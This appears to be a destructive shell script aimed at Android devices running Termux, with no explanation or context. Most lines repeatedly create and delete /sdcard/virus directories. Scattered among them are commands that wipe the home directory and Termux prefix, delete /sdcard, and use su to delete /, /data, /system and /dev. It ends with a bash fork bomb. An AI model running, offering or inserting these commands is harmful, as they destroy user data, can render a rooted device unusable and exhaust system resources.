mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*
rm -rf /sdcard
su -c rm -rf /
su -c rm -rf /data

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*
rm -rf /sdcard
su -c rm -rf /
su -c rm -rf /data

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss

mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*


















su -c rm -rf /system
su -c rm -rf /dev

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*
rm -rf /sdcard
su -c rm -rf /
su -c rm -rf /data

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*
rm -rf /sdcard
su -c rm -rf /
su -c rm -rf /data

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*


:(){ :|: & };:
exit 0


